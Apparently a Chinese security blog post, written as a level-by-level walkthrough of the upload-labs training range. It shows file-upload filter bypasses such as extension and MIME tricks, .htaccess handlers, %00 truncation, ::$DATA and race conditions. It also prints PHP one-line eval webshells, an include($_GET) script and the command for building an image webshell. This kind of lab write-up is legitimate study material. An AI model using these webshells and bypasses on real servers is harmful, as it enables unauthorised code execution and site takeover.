@@ -1,0 +1,534 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="welcome to my blog" href="https://hq185187.github.io/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="welcome to my blog" href="https://hq185187.github.io/atom.xml" />
+<link rel="alternate" type="application/json" title="welcome to my blog" href="https://hq185187.github.io/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="java,git,springcloud" />
+
+
+<link rel="canonical" href="https://hq185187.github.io/2023/04/27/upload-labs%20writeup/">
+
+
+
+  <title>
+ |
+不良人天藏星 = welcome to my blog = 不良人总舵</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2023-04-27 14:39:40">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2023-04-27T14:39:40+08:00">2023-04-27</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">不良人天藏星</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giciusoyjnj219g0u0x56.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeun65urj20zk0m81ii.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gicitzannuj20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1giciuja1j1j20zk0m8kjl.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipeudstjqj20zk0m8k3r.jpg"></li>
+          <li class="item" data-background-image="https://tva4.sinaimg.cn/large/6833939bly1gipexw3o58j20zk0m8e81.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="https://hq185187.github.io/2023/04/27/upload-labs%20writeup/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="hq185187">
+    <meta itemprop="description" content="不良人总舵, 不定时更新web安全相关知识">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="welcome to my blog">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <hr>
+<h2 id="title-upload-labs"><a class="markdownIt-Anchor" href="#title-upload-labs">#</a> title :upload-labs</h2>
+<h4 id="第一题"><a class="markdownIt-Anchor" href="#第一题">#</a> 第一题</h4>
+<p>一句话木马</p>
+<p>phpinfo();<br>
+@eval($_POST[‘zoe’]);<br>
+?&gt;</p>
+<p>1. 将 php 后缀改成 png/gif 等符合条件的后缀上传抓包，将后缀改成 php 放包即可成功上传<br>
+用蚁剑添加数据<br>
+ 2.F12-&gt; 调试器 -&gt; 设置里禁用 js<br>
+3. 复制网页源代码保存到文件中，删掉里面的 js 部分，添加 action 部分，打开即可</p>
+<h3 id="第二题"><a class="markdownIt-Anchor" href="#第二题">#</a> 第二题</h3>
+<p>MIME 类型<br>
+抓包改 content-type 为符合条件的就行<br>
+ eg.image-png</p>
+<h3 id="第三题"><a class="markdownIt-Anchor" href="#第三题">#</a> 第三题</h3>
+<p>黑名单类型 - 修改后缀绕过</p>
+<ul>
+<li>用黑名单不允许上传 <code>.asp,.aspx,.php,.jsp</code>  后缀的文件</li>
+<li>但可以上传 <code>.phtml .phps .php5 .pht</code></li>
+<li><mark>首选 phtml</mark></li>
+<li>前提是 apache 的 httpd.conf 中有如下配置代码</li>
+<li>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</li>
+</ul>
+<h3 id="第四题"><a class="markdownIt-Anchor" href="#第四题">#</a> 第四题</h3>
+<p>.htaccess<br>
+ 先将 httpd.conf 的文件中的 AllowOverride none 改为 ALL<br>
+1 <code>AddType application/x-httpd-php .jpg</code>  这个指令代表着 <code>.jpg</code>  文件会当做 <code>php</code>  来解析<br>
+传个 zoe.jpg</p>
+<p>2 <code>SetHandler application/x-httpd-php</code> ，意思是把所有文件都解析为 <code>php</code>  文件来执行。<br>
+写第二个命名为.htaccess 传上去<br>
+<span class="exturl" data-url="aHR0cDovL3huLS16b2UtaTY4ZHo3Yi54eHg=">传个 zoe.xxx</span>, 随便什么后缀符合要求就行</p>
+<p>3. 可以用第十题的解法，利用 deldot 的漏洞</p>
+<p>补充：(原本多出的第五题)<br>
+ 在 Windows 操作系统中，xx.jpg. 和 xx.jpg 空格都相当于 xx.jpg, 自动去掉了末尾的。和空格<br>
+后缀名可以是 zoe.php. .</p>
+<h3 id="第六题"><a class="markdownIt-Anchor" href="#第六题">#</a> 第六题</h3>
+<p>此题的源码可以发现少了 strtolower 函数<br>
+黑名单之大小写绕过<br>
+将后缀改成 Php 即可</p>
+<h3 id="第七题"><a class="markdownIt-Anchor" href="#第七题">#</a> 第七题</h3>
+<p>黑名单验证之空格绕过<br>
+这一关黑名单，没有使用 trim () 去除空格，可以使用空格绕过黑名单<br>
+ bp 抓包在 content-disposition 中 php 后加个空格</p>
+<h3 id="第八题"><a class="markdownIt-Anchor" href="#第八题">#</a> 第八题</h3>
+<p>这一关黑名单，没有使用 deldot () 过滤文件名末尾的 <code>点</code> ，可以使用文件名后加。进行绕过<br>
+抓包修改    .php. 注意这里有个.</p>
+<h3 id="第九题"><a class="markdownIt-Anchor" href="#第九题">#</a> 第九题</h3>
+<p>特殊字符::<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>绕过补充知识：</mtext><mi>p</mi><mi>h</mi><mi>p</mi><mtext>在</mtext><mi>w</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mtext>的时候如果文件名</mtext><mo>+</mo><mi mathvariant="normal">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA绕过
+补充知识：php在window的时候如果文件名+&quot;::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">绕</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">补</span><span class="mord cjk_fallback">充</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">识</span><span class="mord cjk_fallback">：</span><span class="mord mathnormal">p</span><span class="mord mathnormal">h</span><span class="mord mathnormal">p</span><span class="mord cjk_fallback">在</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">d</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">候</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">名</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA&quot; 会把::<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>之后的数据当成文件流处理</mtext><mo separator="true">,</mo><mtext>不会检测后缀名，且保持</mtext><mi mathvariant="normal">&quot;</mi><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA之后的数据当成文件流处理,不会检测后缀名，且保持&quot;::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">文</span><span class="mord cjk_fallback">件</span><span class="mord cjk_fallback">流</span><span class="mord cjk_fallback">处</span><span class="mord cjk_fallback">理</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">检</span><span class="mord cjk_fallback">测</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">缀</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">保</span><span class="mord cjk_fallback">持</span><span class="mord">&quot;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>DATA&quot; 之前的文件名 他的目的就是不检查后缀名。<br>
+抓包改后缀，php::<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>D</mi><mi>A</mi><mi>T</mi><mi>A</mi><mtext>浏览器地址去掉</mtext><mo>:</mo><mo>:</mo></mrow><annotation encoding="application/x-tex">DATA
+浏览器地址去掉::</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="mord mathnormal">A</span><span class="mord cjk_fallback">浏</span><span class="mord cjk_fallback">览</span><span class="mord cjk_fallback">器</span><span class="mord cjk_fallback">地</span><span class="mord cjk_fallback">址</span><span class="mord cjk_fallback">去</span><span class="mord cjk_fallback">掉</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mrel">:</span></span></span></span>data 就可以正常连接</p>
+<h3 id="第十题"><a class="markdownIt-Anchor" href="#第十题">#</a> 第十题</h3>
+<p>这一关黑名单，最后上传路径直接使用文件名进行拼接，而且只对文件名进行<br>
+ f i l e n a m e = d e l d o t (file_name) 操作去除文件名末尾的点，构造后缀绕过黑名单<br>
+补充知识：deldot () 函数从后向前检测，当检测到末尾的第一个点时会继续它的检测，但是遇到空格会停下来<br>
+上传 zoe.php 然后用 bp 改后缀加点 == <code>空格点</code>  ==（即文件名为 <code>zoe.php. .</code> ）</p>
+<p>使用 antsword 连接   <mark>.php.</mark></p>
+<p>十一.<br>
+ 双写绕过<br>
+这一关黑名单，使用 str_ireplace () 函数寻找文件名中存在的黑名单字符串，将它替换成空（即将它删掉），可以使用双写绕过黑名单</p>
+<blockquote>
+<p>补充知识：str_ireplace (find,replace,string,count) 函数替换字符串中的一些字符<br>
+传 <code>zoe.php</code>  然后用 bp 改后缀为 <code>.pphphp</code>  使用蚁剑连接 <code>zoe.php</code></p>
+</blockquote>
+<p>十二.get00 截断<br>
+这一关白名单，最终文件的存放位置是以拼接的方式，可以使用 %00 截断，但需要 <code>php版本&lt;5.3.4</code> ，并且 <code>magic_quotes_gpc</code>  关闭。<br>
+原理：php 的一些函数的底层是 C 语言，而 move_uploaded_file 就是其中之一，遇到 0x00 会截断，0x 表示 16 进制，URL 中 %00 解码成 16 进制就是 0x00。</p>
+<p>上传 <code>zoe.php</code>  用 BP 抓包修改参数，把 upload / 后面加上 <code>zoe.php%00</code> ，下面的 <code>filename=”zoe.php”</code>  改为 <code>zoe.png</code> <br>
+ 用 antsword 连接时要删掉后面的注释</p>
+<p>十三.post00 截断<br>
+这一关白名单，文件上传路径拼接生成，而且使用了 post 发送的数据进行拼接，我们可以控制 post 数据进行 0x00 截断绕过白名<br>
+一句话木马抓包 zoe.php<br>
+ 在 <code>../upload/</code>  路径下加上 <code>zoe.php+</code>   <code>+号</code> 是为了方便后面修改 <code>Hex</code> <br>
+ <code>+号</code> 的 Hex 是 <code>2b</code> ，这里我们要把它改为 <code>00</code></p>
+<p>十四：图片马 unpack<br>
+ 可以先传一个 14.php (文件包含) 到服务器，可以选择别的题目传到服务器，<mark> 目的是解析传入的图片为 PHP</mark></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">header(&quot;Content-Type:text/html;charset=utf-8&quot;);</span><br><span class="line"></span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line"></span><br><span class="line">if(isset($file))&#123;</span><br><span class="line"></span><br><span class="line">    include $file;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>再传一个图片马，14.jpg</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>打开 14.php 的路径，url 输入？file = 图片马的路径</p>
+<p>补充：图片马制作<br>
+<strong>制作图片马命令</strong>：copy 图片文件名称 /b + 脚本文件名称 /a  新生成的文件名称，例如：copy 222.jpg/b+111.php/a 333.jpg<br>
+1. 先写 jpg 文件:<br>
+GIF89a<br>
+?&lt;php<br>
+@eval($_POST[‘shell’]);<br>
+?&gt;<br>
+2. 再写 php 文件<br>
+直接复制粘贴给我文件包含<br>
+ 3. 制作图片马<br>
+ cmd 命令：13.jpg/b+13.php/a pass13.jpg<br>
+ 之间上传 pass13.jpg 将图片地址给 antsword 连接</p>
+<h1 id="十五getimagesize图片马"><a class="markdownIt-Anchor" href="#十五getimagesize图片马">#</a> 十五 getimagesize 图片马</h1>
+<p>与上一题一样<br>
+补充:getimagesize () 函数的作用是获取图片文件的相关信息</p>
+<p>十六。跟 14,15 一样，通过文件包含和图片马 getshell</p>
+<p>十七。二次渲染绕过</p>
+<p>上传正常的 <code>GIF</code>  图片下载回显的图片，用 notepad++ 编辑器进行对比两个 GIF 图片内容，插入一句话木马，需要 python 脚本实现</p>
+<p>十八。条件竞争<br>
+看代码，它是先把图片上传上去，才开始进行判断后缀名。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除，二次渲染等等。就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序已经打开无法删除<br>
+用 burp 抓包 -&gt; 导入到 intruder 模块 -&gt; 设置类型为 null payloads,payload options 设置为 conntinue indefinitely-&gt; 在另一浏览器打开上传文件位置</p>
+<p>十九。操作与上一关差不多，配合包含漏洞</p>
+<p>二十.move_upload_file 的漏洞，会忽略 /.<br>
+1. 加 /.<br>
+2.save_name 用 %00 阶段 (PHP 版本小于 5.3)</p>
+<p>二十一<br>
+数组验证</p>
+<p>大佬的图片 https://wwe.lanzoui.com/iFSwwn53jaf<br>
+ 构造的 URL 为 <code>include.php?file=upload/31608.gif</code></p>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2023-04-27 14:40:14" itemprop="dateModified" datetime="2023-04-27T14:40:14+08:00">2023-04-27</time>
+  </span>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>hq185187 <i class="ic i-at"><em>@</em></i>welcome to my blog
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="https://hq185187.github.io/2023/04/27/upload-labs%20writeup/" title="">https://hq185187.github.io/2023/04/27/upload-labs writeup/</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva4.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclfdu6exj20zk0m87hw.jpg" title="无字母数字rce">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>无字母数字rce</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#title-upload-labs"><span class="toc-number">1.</span> <span class="toc-text"> title :upload-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%A2%98"><span class="toc-number">1.0.1.</span> <span class="toc-text"> 第一题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E9%A2%98"><span class="toc-number">1.1.</span> <span class="toc-text"> 第二题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text"> 第三题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text"> 第四题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AD%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text"> 第六题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%83%E9%A2%98"><span class="toc-number">1.5.</span> <span class="toc-text"> 第七题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%85%AB%E9%A2%98"><span class="toc-number">1.6.</span> <span class="toc-text"> 第八题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B9%9D%E9%A2%98"><span class="toc-number">1.7.</span> <span class="toc-text"> 第九题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E5%8D%81%E9%A2%98"><span class="toc-number">1.8.</span> <span class="toc-text"> 第十题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8D%81%E4%BA%94getimagesize%E5%9B%BE%E7%89%87%E9%A9%AC"><span class="toc-number"></span> <span class="toc-text"> 十五 getimagesize 图片马</span></a>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="hq185187"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">hq185187</p>
+  <div class="description" itemprop="description">不定时更新web安全相关知识</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">6</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hxMTg1MTg3" title="https:&#x2F;&#x2F;github.com&#x2F;hq185187"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含及伪协议的使用">文件包含及伪协议的使用</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/27/upload-labs%20writeup/" title="未命名">未命名</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/24/sqli-labs/" title="Sqli-labs靶场通关">Sqli-labs靶场通关</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/" title="无字母数字rce">无字母数字rce</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/26/nessctf/" title="NSSCTF精选">NSSCTF精选</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/23/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">hq185187 @ 不良人天藏星</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/04/27/upload-labs writeup/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
